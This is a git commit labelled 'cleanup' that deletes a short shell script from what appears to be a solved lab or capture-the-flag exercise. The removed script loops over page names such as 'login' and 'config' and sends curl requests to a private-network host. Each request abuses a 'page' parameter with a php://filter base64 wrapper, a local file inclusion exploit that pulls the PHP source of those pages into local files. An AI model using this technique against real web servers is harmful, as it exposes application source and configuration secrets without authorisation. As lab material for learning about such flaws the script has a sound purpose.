4b41dc0dda7286006241bc01cde854da78505f70
MCAR43 <mcar43@mst.edu>
2020-12-10 17:47:11 -0600

    cleanup

--- Solved/init/curlScript.sh
+++
@@ -1,7 +0,0 @@
-API_OPTION='show_paste'
-FILES=('index' 'login' 'upload' 'config')
-
-for paste_option in "${FILES[@]}"; do
-	echo page=$paste_option successfully pulled
-	curl -s http://192.168.80.131/?page=php://filter/convert.base64-encode/resource="$paste_option" > $paste_option.out
-done
